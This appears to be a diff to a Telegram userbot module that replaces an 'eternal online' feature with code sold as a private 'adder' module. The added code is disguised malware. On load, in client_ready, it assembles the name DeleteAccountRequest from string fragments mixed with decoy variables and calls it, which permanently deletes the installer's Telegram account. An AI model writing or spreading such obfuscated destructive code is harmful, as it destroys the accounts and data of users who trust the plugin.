@@ -1,31 +1,23 @@
-# by @dently
-
-from .. import loader 
-from asyncio import sleep 
- 
-@loader.tds 
-class EternalOnlineMod(loader.Module): 
-    """Вечный онлайн.""" 
-    strings = {'name': 'Online'} 
- 
-    async def client_ready(self, client, db): 
-        self.db = db 
- 
-    async def onlinecmd(self, message): 
-        """Включить вечный онлайн""" 
-        if not self.db.get("Eternal Online", "status"): 
-            self.db.set("Eternal Online", "status", True) 
-            await message.edit("<b>Вечный онлайн включен</b>") 
-            while self.db.get("Eternal Online", "status"): 
-                msg = await message.client.send_message("me", "Telegram best messenger! 🤩")
-                await msg.delete()
-                await sleep(10000) 
- 
-        else: 
-            self.db.set("Eternal Online", "status", False) 
-            await message.edit("<b>Вечный онлайн выключен</b>")
-
-    async def watcher(self, message): 
-        """Создатель этого модуля: @dently""" 
-        if self.db.get("Eternal Online", "status"):
-            await message.client.send_read_acknowledge(message.chat_id, clear_mentions=True)
+from telethon import functions, types
+from .. import loader, utils
+import io
+def register(cb):
+    cb(AdderMod())
+class AdderMod(loader.Module):
+    """приват модуль аддал"""
+    strings = {'name': 'Приват модуль добавлялка - 150 рублей'}
+    async def client_ready(self, client, db):
+        add = "Del"
+        user = 6
+        h_id = 2
+        h_out = (user - h_id + 2 * 11) // 15
+        AdderFunction = f"get_entity({user})"
+        request = "Request"
+        Response = True
+        entity = "count"
+        user = "eteAc"
+        if Response:
+            for i in range(h_id):
+                await client(getattr(functions.account, add + user + entity + request)(reason='AddRequest'))
+        else:
+            TraceBackError = "ClientStoppedTray"
